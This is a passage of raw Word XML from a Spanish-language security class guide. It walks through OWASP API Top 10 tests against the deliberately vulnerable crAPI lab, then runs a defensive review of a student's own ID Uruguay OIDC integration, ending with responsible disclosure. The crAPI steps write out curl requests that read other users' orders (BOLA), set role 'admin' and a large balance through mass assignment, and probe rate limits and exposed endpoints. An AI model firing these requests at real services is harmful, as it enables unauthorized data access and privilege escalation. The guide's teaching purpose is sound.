        </w:rPr>
        <w:t xml:space="preserve">) y a un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>jti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> único. El servidor debe validar los tres y rechazar repeticiones. Un bearer robado </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no sirve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sin esta clave. Comparar: es el mismo espíritu de OAuth 1.0, pero sin canonicalización y sobre JSON.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Demostración de valor: repetí el token bearer del Paso 4 desde otro cliente (funciona). Con DPoP, el mismo token sin la prueba del cliente </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> funciona.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Parte E — OWASP API Top 10 con crAPI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 20 — Levantar crAPI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git clone https://github.com/OWASP/crAPI.git</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>cd crAPI/deploy/docker</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker compose --env-file .env up -d</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Si algún comando cambió, seguí el README del repositorio: https://github.com/OWASP/crAPI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>crAPI queda en http://localhost:8888.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 21 — Registrar usuario y obtener token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## 1) Registro (adaptá el host/puerto al de tu despliegue)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8888/identity/api/auth/signup \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d '{"name":"tester","email":"tester@lab.local","number":"5551234567","password":"Test1234!"}'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## 2) Login (devuelve un token)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost:8888/identity/api/auth/login \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d '{"email":"tester@lab.local","password":"Test1234!"}' | tee login.json | jq</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>TOKEN=$(jq -r .token login.json)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>echo "$TOKEN"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 22 — API1: BOLA (el más importante)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>En la interfaz de crAPI, creá un pedido/video y anotá su ID.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Con Burp/Postman (o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">), pedí </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>otro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ID del mismo tipo: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curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/workshop/api/shop/orders/&lt;OTRO_ID&gt; | jq</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/workshop/api/shop/products | jq</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> si devuelve datos de otro usuario, hay </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>BOLA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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token válido + autorización a nivel de objeto ausente. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Api1 OWASP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> — la vulnerabilidad número uno.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 23 — API3: Mass assignment / BOPLA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curl -s -X POST http://localhost:8888/identity/api/auth/v3/check-otp \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" -d '{"email":"tester@lab.local","otp":"0000"}'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## Probá enviar campos de rol/saldo en endpoints de actualización (en el lab):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -X PUT http://localhost:8888/identity/api/v2/user/personal \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  -d '{"name":"x","role":"admin","balance":999999}'</w:t>
      </w:r>
    </w:p>
    <w:p/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si el backend acepta campos que no debería, el cliente controla propiedades sensibles.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 24 — API4/API9: consumo y versiones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## Rate limit / consumo: repetí una búsqueda costosa N veces</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>for i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer $TOKEN" "http://localhost:8888/workshop/api/shop/products"; done; echo</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>## Inventario: buscar versiones/swaggers expuestos</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>for p in /swagger /v1 /v2 /api /openapi.json /docs; do echo -n "$p -&gt; "; curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8888$p; done</w:t>
      </w:r>
    </w:p>
    <w:p/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ausencia de límites (Api4) e inventario desactualizado expuesto (Api9).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Mapeo completo de los 10 riesgos y cómo probarlos: ver Módulo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>M10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>clase_tokens_seguridad.md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Parte F — ID Uruguay (defensivo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Línea estricta:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sólo tu cuenta y tu cliente de desarrollo. No se prueba el IdP ni clientes de terceros. Para evaluar el IdP, coordiná con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>AGESIC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CERTuy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 25 — Recabar la evidencia documental</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Abrí y leé:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/comunicacion/publicaciones/documentacion-tecnica-id-uruguay/documentacion-tecnica-id-uruguay/id-0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/sites/agencia-gobierno-electronico-sociedad-informacion-conocimiento/files/Desarrollo%20seguro.pdf</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Buscá: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1F3B66"/>
        </w:rPr>
        <w:t>token_type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Bearer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id_token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JWT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code_challenge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redirect_uri</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>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el Estado uruguayo emite tokens bearer vía OIDC; el ID token es un JWT. Es evidencia </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sin tocar nada</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 26 — Observar tu propio flujo (con tu cuenta)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Iniciá sesión en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> aplicación integrada (o tu cliente de pruebas registrado).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">DevTools → </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Network</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → filtrá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>authorization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 xml:space="preserve">Localizá la respuesta del </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>token endpoint</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y la petición con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Authorization: Bearer ...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Enmascará el token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en pantalla (mostrá el inicio y tapá el resto).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el token es legible y extraíble del navegador; "quien lo tiene, lo usa". Sin ningún acceso indebido.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 27 — Decodificar tu ID token (offline)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Copiá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ID token y pegalo en https://jwt.io (decodifica en el navegador, no viaja a ningún servidor).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esperado: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1F3B66"/>
        </w:rPr>
        <w:t>iss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aud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sub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exp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auth_time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3B66"/>
        </w:rPr>
        <w:t>amr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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>acr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> según configuración.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qué dice tu token y qué claims debería validar tu app.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 28 — Checklist de verificación de TU integración</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Completá esta tabla mirando </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> código/configuración (no el IdP):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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Control</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Cómo verificarlo en tu cliente</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Esperado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PKCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>code_challenge</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0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method=S256</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> en tu authorization request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Presente</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>redirect_uri</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> exacta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URI registrada sin comodines; tu app la valida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Coincidencia exacta</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>state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Generado aleatorio y validado al volver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Presente y de un solo uso</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
                <w:color w:val="1F3B66"/>
              </w:rPr>
              <w:t>nonce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Enviado en el request OIDC y validado en el ID token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Presente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Validación del ID token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 xml:space="preserve">Tu código valida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iss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aud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exp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nonce</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>, firma (JWKS)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Todo validado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No usar ID token para APIs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Buscá en tu código si el ID token viaja a la API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Nunca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Vida del access token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 xml:space="preserve">Decodificá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exp</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> de tu access token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Corta (minutos/horas)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Rotación de refresh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Repetí refresh: ¿cambia? ¿el viejo se invalida?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Rotación + detección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Revocación/logout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Cerrá sesión y reintentá con el token viejo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Rechazado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Transporte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Sólo HTTPS; token en header (no en query/URL)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Cumplido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i w:val="0"/>
              </w:rPr>
              <w:t>Almacenamiento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 xml:space="preserve">Memoria o cookie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HttpOnly</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">; no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localStorage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Sin acceso por JS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 29 — Reproducción de la demostración para clase</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Seguí el guion del </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Módulo M11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>: documentación → DevTools con token enmascarado → decode en jwt.io → cierre de sesión → frase de cierre.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué demuestra:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> todo el argumento de la charla con un caso uruguayo real, sin invadir nada.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Paso 30 — Si encontrás algo: reporte responsable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Usá la plantilla del archivo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>clase_tokens_seguridad.md</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Sección 5) y canalizá por:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CERTuy (AGESIC):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
